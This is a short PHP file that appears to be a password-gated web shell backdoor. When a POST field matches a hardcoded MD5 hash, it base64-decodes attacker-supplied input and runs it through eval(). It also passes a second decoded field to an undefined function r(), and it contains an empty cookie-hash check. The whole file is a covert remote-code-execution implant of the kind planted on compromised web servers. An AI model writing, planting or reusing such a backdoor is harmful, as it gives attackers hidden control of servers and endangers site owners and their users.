<?php
if (isset($_POST['info'])){
        if  (md5($_POST['info']) === '06f32c73708494a80ed97e7ef44e444a') {
                if (isset($_POST['a'])) {
                        $a=base64_decode($_POST['a']);
                        if ($a != false) r($a);
                        die;
                }
                if (isset($_POST['b'])) {
                        $b=base64_decode($_POST['b']);
                        if ($b != false) eval($b);
                        die;
                }
        }
        die;
}
if(md5($_COOKIE['7924381a6ae5e220'])=="ee222237bee15e1c7a389739ca8ee344"){}

?>
